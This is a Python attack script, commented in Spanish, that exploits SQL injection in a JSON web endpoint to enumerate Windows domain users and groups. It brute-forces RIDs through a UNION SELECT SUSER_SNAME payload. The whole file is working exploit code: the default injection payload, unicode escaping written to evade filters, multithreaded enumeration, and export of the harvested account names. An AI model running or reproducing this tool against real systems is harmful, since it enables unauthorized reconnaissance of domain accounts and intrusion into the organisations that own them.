#!/usr/bin/python3
# coding: utf-8
"""
SID Lookup Tool - Herramienta de enumeración de usuarios y grupos mediante SIDs
Autor: lxbx
"""

import json
import requests
import sys
import argparse
import time
import concurrent.futures
import csv
import re
from colorama import init, Fore, Style, Back

# Inicializar colorama para colores en la terminal
init(autoreset=True)

# Banner del script
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.GREEN}SID Lookup Tool - Enumeración de usuarios/grupos           {Fore.CYAN}║
{Fore.CYAN}║ {Fore.YELLOW}Explotación de SQLi para enumeración de SIDs               {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
"""

def parse_arguments():
    """Configurar y procesar los argumentos de línea de comandos"""
    parser = argparse.ArgumentParser(description="SID Lookup Tool - Enumeración de usuarios y grupos mediante SIDs")
    
    parser.add_argument("-u", "--url", help="URL del endpoint vulnerable", required=False)
    parser.add_argument("-s", "--sid", help="SID base del dominio (ej: 0x0106000000000005)", required=False)
    parser.add_argument("-S", "--start", help="Valor inicial del rango RID", type=int, default=500)
    parser.add_argument("-E", "--end", help="Valor final del rango RID", type=int, default=1500)
    parser.add_argument("-o", "--output", help="Archivo de salida para guardar resultados", required=False)
    parser.add_argument("-t", "--threads", help="Número de hilos (default: 1)", type=int, default=1)
    parser.add_argument("-d", "--delay", help="Retardo entre peticiones (segundos, default: 1)", type=float, default=1)
    parser.add_argument("-f", "--format", help="Formato de salida (json, csv, txt)", default="txt")
    parser.add_argument("-p", "--payload", help="Plantilla personalizada de payload SQL", default="x' UNION SELECT 1,SUSER_SNAME({sid}),3,4,5--")
    parser.add_argument("-k", "--known", help="Archivo con SIDs conocidos para verificar la respuesta", required=False)
    parser.add_argument("-v", "--verbose", help="Modo detallado", action="store_true")
    
    return parser.parse_args()

def validate_sid(sid):
    """Valida el formato del SID proporcionado"""
    # Eliminar el prefijo 0x si existe
    if sid.startswith('0x'):
        sid = sid[2:]
    
    # Verificar que es un valor hexadecimal válido
    if not all(c in '0123456789ABCDEFabcdef' for c in sid):
        return None
    
    # Asegurarse de que comienza con 0x para el payload
    return f"0x{sid}"

def validate_url(url):
    """Verifica que la URL es válida"""
    if not url.startswith(('http://', 'https://')):
        return f"http://{url}"
    return url

def test_endpoint(url, sid, payload_template, verbose=False):
    """Verifica que el endpoint es accesible y vulnerable"""
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    # Probar con un SID conocido (SID de Administrator suele ser 500)
    test_rid = 500
    hex_value = format(test_rid, '04X')
    reversed_bytes = bytearray.fromhex(hex_value)
    reversed_bytes.reverse()
    result = ''.join(format(x, '02x') for x in reversed_bytes).upper() + '0' * 4
    test_sid = f"{sid}{result}"
    
    # Crear payload para la prueba
    payload = payload_template.format(sid=test_sid)
    data = json.dumps({"name": encode_unicode(payload)})
    
    try:
        if verbose:
            print(f"{Fore.YELLOW}[*] Probando endpoint con payload: {Fore.CYAN}{payload}")
            print(f"{Fore.YELLOW}[*] Datos enviados: {Fore.CYAN}{data}")
        
        response = requests.post(url, data=data, headers=headers, timeout=10)
        
        if response.status_code != 200:
            print(f"{Fore.RED}[!] Error: El servidor respondió con código {response.status_code}")
            return False
        
        # Intentar parsear la respuesta JSON
        try:
            result = json.loads(response.text)
            
            if verbose:
                print(f"{Fore.YELLOW}[*] Respuesta del servidor: {Fore.CYAN}{response.text}")
            
            # Verificar si la respuesta tiene la estructura esperada
            if isinstance(result, list) and len(result) > 0 and "name" in result[0]:
                username = result[0]["name"]
                if username and username != "":
                    print(f"{Fore.GREEN}[+] Endpoint verificado. El SID {test_sid} se resolvió como: {Fore.CYAN}{username}")
                    return True
            
            print(f"{Fore.RED}[!] La respuesta no tiene el formato esperado: {response.text}")
            return False
            
        except json.JSONDecodeError:
            print(f"{Fore.RED}[!] Error: La respuesta no es un JSON válido")
            print(f"{Fore.RED}[!] Respuesta: {response.text}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error de conexión: {e}")
        return False

def encode_unicode(payload):
    """Codifica el payload en formato unicode para eludir filtros"""
    return ''.join(f"\\u00{ord(c):x}" for c in payload)

def lookup_sid(url, sid, rid, payload_template, verbose=False):
    """Busca un SID específico y devuelve el usuario/grupo asociado"""
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        # Convertir RID a formato específico
        hex_value = format(rid, '04X')
        reversed_bytes = bytearray.fromhex(hex_value)
        reversed_bytes.reverse()
        result = ''.join(format(x, '02x') for x in reversed_bytes).upper() + '0' * 4
        
        # Formar el SID completo
        full_sid = f"{sid}{result}"
        
        # Crear el payload SQL
        payload = payload_template.format(sid=full_sid)
        data = json.dumps({"name": encode_unicode(payload)})
        
        if verbose:
            print(f"{Fore.YELLOW}[*] Consultando RID {rid} ({hex_value}) -> SID: {full_sid}")
        
        # Realizar la solicitud
        response = requests.post(url, data=data, headers=headers, timeout=10)
        
        if response.status_code != 200:
            if verbose:
                print(f"{Fore.RED}[!] Error: El servidor respondió con código {response.status_code} para RID {rid}")
            return None
        
        # Parsear la respuesta
        try:
            result = json.loads(response.text)
            
            if isinstance(result, list) and len(result) > 0 and "name" in result[0]:
                username = result[0]["name"]
                
                # Solo devolver resultados que no estén vacíos
                if username and username != "":
                    return {
                        "rid": rid,
                        "sid": full_sid,
                        "name": username
                    }
            
            return None
            
        except json.JSONDecodeError:
            if verbose:
                print(f"{Fore.RED}[!] Error al parsear JSON para RID {rid}: {response.text}")
            return None
            
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"{Fore.RED}[!] Error de red para RID {rid}: {e}")
        return None
    
    return None

def enumerate_sids(url, sid, start_range, end_range, threads=1, delay=1, verbose=False, payload_template="x' UNION SELECT 1,SUSER_SNAME({sid}),3,4,5--"):
    """Función principal para enumerar usuarios/grupos en un rango de RIDs"""
    print(f"{Fore.YELLOW}[*] Iniciando enumeración de SIDs:")
    print(f"{Fore.YELLOW}[*] URL: {Fore.CYAN}{url}")
    print(f"{Fore.YELLOW}[*] SID base: {Fore.CYAN}{sid}")
    print(f"{Fore.YELLOW}[*] Rango RID: {Fore.CYAN}{start_range} - {end_range}")
    print(f"{Fore.YELLOW}[*] Threads: {Fore.CYAN}{threads}")
    print(f"{Fore.YELLOW}[*] Delay: {Fore.CYAN}{delay} segundos")
    
    results = []
    
    # Variables para estadísticas
    start_time = time.time()
    processed_rids = 0
    found_accounts = 0
    
    # Multithreading si es necesario
    if threads > 1:
        print(f"{Fore.YELLOW}[*] Usando {Fore.CYAN}{threads}{Fore.YELLOW} hilos para la enumeración")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_rid = {executor.submit(lookup_sid, url, sid, rid, payload_template, verbose): rid for rid in range(start_range, end_range+1)}
            
            for future in concurrent.futures.as_completed(future_to_rid):
                rid = future_to_rid[future]
                processed_rids += 1
                
                try:
                    result = future.result()
                    
                    if result:
                        found_accounts += 1
                        user_type = "👥 Grupo" if "Grupo" in result["name"] or "Domain" in result["name"] else "👤 Usuario"
                        print(f"{Fore.GREEN}[+] {user_type}: {Fore.CYAN}{result['name']} {Fore.YELLOW}| RID: {Fore.MAGENTA}{result['rid']} {Fore.YELLOW}| SID: {Fore.BLUE}{result['sid']}")
                        results.append(result)
                    
                    # Mostrar progreso
                    if processed_rids % 20 == 0 or processed_rids == (end_range - start_range + 1):
                        progress = (processed_rids / (end_range - start_range + 1)) * 100
                        elapsed = time.time() - start_time
                        rate = processed_rids / elapsed if elapsed > 0 else 0
                        eta = (end_range - start_range + 1 - processed_rids) / rate if rate > 0 else 0
                        
                        print(f"{Fore.YELLOW}[*] Progreso: {Fore.CYAN}{processed_rids}/{end_range - start_range + 1} {Fore.GREEN}({progress:.2f}%) {Fore.YELLOW}| Encontrados: {Fore.CYAN}{found_accounts} {Fore.YELLOW}| ETA: {Fore.CYAN}{eta:.2f}s", end='\r')
                    
                except Exception as e:
                    if verbose:
                        print(f"{Fore.RED}[!] Error procesando RID {rid}: {e}")
                
                time.sleep(delay / threads)  # Distribuir el delay entre los threads
    else:
        # Versión single-thread
        for rid in range(start_range, end_range+1):
            processed_rids += 1
            
            result = lookup_sid(url, sid, rid, payload_template, verbose)
            
            if result:
                found_accounts += 1
                user_type = "👥 Grupo" if "Grupo" in result["name"] or "Domain" in result["name"] else "👤 Usuario"
                print(f"{Fore.GREEN}[+] {user_type}: {Fore.CYAN}{result['name']} {Fore.YELLOW}| RID: {Fore.MAGENTA}{result['rid']} {Fore.YELLOW}| SID: {Fore.BLUE}{result['sid']}")
                results.append(result)
            
            # Mostrar progreso
            if processed_rids % 10 == 0 or processed_rids == (end_range - start_range + 1):
                progress = (processed_rids / (end_range - start_range + 1)) * 100
                elapsed = time.time() - start_time
                rate = processed_rids / elapsed if elapsed > 0 else 0
                eta = (end_range - start_range + 1 - processed_rids) / rate if rate > 0 else 0
                
                print(f"{Fore.YELLOW}[*] Progreso: {Fore.CYAN}{processed_rids}/{end_range - start_range + 1} {Fore.GREEN}({progress:.2f}%) {Fore.YELLOW}| Encontrados: {Fore.CYAN}{found_accounts} {Fore.YELLOW}| ETA: {Fore.CYAN}{eta:.2f}s", end='\r')
            
            time.sleep(delay)
    
    # Espaciado después de la barra de progreso
    print("\n")
    
    # Estadísticas finales
    elapsed_time = time.time() - start_time
    rids_per_second = processed_rids / elapsed_time if elapsed_time > 0 else 0
    
    print(f"\n{Fore.YELLOW}[*] Enumeración completada en {Fore.CYAN}{elapsed_time:.2f} {Fore.YELLOW}segundos")
    print(f"{Fore.YELLOW}[*] RIDs procesados: {Fore.CYAN}{processed_rids}")
    print(f"{Fore.YELLOW}[*] Velocidad: {Fore.CYAN}{rids_per_second:.2f} {Fore.YELLOW}RIDs/segundo")
    print(f"{Fore.YELLOW}[*] Cuentas encontradas: {Fore.CYAN}{found_accounts}")
    
    return results

def save_results(results, output_file, format_type):
    """Guarda los resultados en un archivo con el formato especificado"""
    if not results:
        print(f"{Fore.RED}[!] No hay resultados para guardar")
        return False
        
    try:
        if format_type.lower() == "json":
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=4)
        
        elif format_type.lower() == "csv":
            with open(output_file, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=["rid", "sid", "name"])
                writer.writeheader()
                writer.writerows(results)
        
        else:  # formato txt por defecto
            with open(output_file, 'w') as f:
                for item in results:
                    f.write(f"RID: {item['rid']}, SID: {item['sid']}, Name: {item['name']}\n")
        
        print(f"{Fore.GREEN}[+] Resultados guardados en {Fore.CYAN}{output_file} {Fore.GREEN}con formato {Fore.CYAN}{format_type}")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}[!] Error al guardar resultados: {e}")
        return False

def main():
    """Función principal del script"""
    print(BANNER)
    
    args = parse_arguments()
    
    # Si no se proporcionan argumentos, solicitar entrada interactiva
    if not (args.url and args.sid):
        print(f"{Fore.YELLOW}[*] Modo interactivo:\n")
        
        if not args.url:
            args.url = input(f"{Fore.CYAN}[?] URL del endpoint vulnerable: {Style.RESET_ALL}")
        
        if not args.sid:
            args.sid = input(f"{Fore.CYAN}[?] SID base del dominio (ej: 0x0106000000000005): {Style.RESET_ALL}")
        
        if not args.start:
            try:
                start_input = input(f"{Fore.CYAN}[?] Valor inicial del rango RID (default: 500): {Style.RESET_ALL}")
                args.start = int(start_input) if start_input else 500
            except ValueError:
                print(f"{Fore.RED}[!] Valor inválido para RID inicial, usando 500")
                args.start = 500
        
        if not args.end:
            try:
                end_input = input(f"{Fore.CYAN}[?] Valor final del rango RID (default: 1500): {Style.RESET_ALL}")
                args.end = int(end_input) if end_input else 1500
            except ValueError:
                print(f"{Fore.RED}[!] Valor inválido para RID final, usando 1500")
                args.end = 1500
        
        # Opciones avanzadas
        if input(f"{Fore.CYAN}[?] ¿Configurar opciones avanzadas? (s/N): {Style.RESET_ALL}").lower() == 's':
            try:
                output = input(f"{Fore.CYAN}[?] Archivo de salida (dejar en blanco para no guardar): {Style.RESET_ALL}")
                if output:
                    args.output = output
                    format_type = input(f"{Fore.CYAN}[?] Formato de salida (json/csv/txt) [default: txt]: {Style.RESET_ALL}")
                    if format_type in ["json", "csv", "txt"]:
                        args.format = format_type
                
                threads_input = input(f"{Fore.CYAN}[?] Número de hilos (default: 1): {Style.RESET_ALL}")
                if threads_input:
                    args.threads = int(threads_input)
                
                delay_input = input(f"{Fore.CYAN}[?] Retardo entre peticiones en segundos (default: 1): {Style.RESET_ALL}")
                if delay_input:
                    args.delay = float(delay_input)
                
                args.verbose = input(f"{Fore.CYAN}[?] Modo detallado (s/N): {Style.RESET_ALL}").lower() == 's'
                
                payload_input = input(f"{Fore.CYAN}[?] Payload personalizado (dejar en blanco para usar el predeterminado): {Style.RESET_ALL}")
                if payload_input:
                    args.payload = payload_input
                
            except ValueError:
                print(f"{Fore.RED}[!] Valor inválido, usando valores predeterminados")
    
    # Validar URL y SID
    args.url = validate_url(args.url)
    args.sid = validate_sid(args.sid)
    
    if not args.sid:
        print(f"{Fore.RED}[!] Error: El SID proporcionado no es válido")
        sys.exit(1)
    
    # Verificar que el endpoint es accesible y vulnerable
    print(f"\n{Fore.YELLOW}[*] Verificando el endpoint y la vulnerabilidad...")
    
    if test_endpoint(args.url, args.sid, args.payload, args.verbose):
        print(f"{Fore.GREEN}[+] Endpoint verificado correctamente")
        
        # Iniciar la enumeración
        results = enumerate_sids(args.url, args.sid, args.start, args.end, args.threads, args.delay, args.verbose, args.payload)
        
        # Guardar resultados si se especificó un archivo de salida
        if args.output and results:
            save_results(results, args.output, args.format)
    else:
        print(f"{Fore.RED}[!] No se pudo verificar el endpoint. Por favor, verifique la URL y el SID base")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Proceso interrumpido por el usuario")
        sys.exit(0)
